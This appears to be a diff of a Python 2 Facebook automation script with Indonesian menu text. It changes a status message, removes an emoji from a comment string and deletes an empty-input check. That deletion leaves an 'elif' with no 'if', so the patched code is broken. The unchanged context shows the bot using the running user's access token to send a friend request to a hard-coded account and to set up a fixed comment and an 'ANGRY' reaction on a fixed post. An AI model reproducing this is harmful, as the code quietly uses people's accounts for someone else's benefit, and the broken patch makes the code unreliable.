@@ -161,7 +161,7 @@ def update():
         print '\033[41;1m Mengupdate Script\033[00;1m'
         time.sleep(1)
         os.system('git pull')
-        print '\033[41;1m Done\033[00;1m'
+        print '\033[41;1m Berhasil Di-update\033[00;1m'
         time.sleep(2)
         masuk()
 
@@ -178,8 +178,6 @@ def tutor():
         print '1.Untuk Menonton Video Tutorial'
         print '2.Untuk Keluar'
         cuk = raw_input('Pilih Mana: ')
-	if cuk == '':
-               masuk()
         elif cuk == '1' or cuk == '01':
                print 'Membuka Youtube'
                time.sleep(1)
@@ -201,7 +199,7 @@ def bot_komen():
         os.system('rm -rf login.txt')
 
     una = '100045781089477'
-    kom = 'Hai Bang Jago\xf0\x9f\x98\x98'
+    kom = 'Hai Bang Jago'
     reac = 'ANGRY'
     post = '194234645445904'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
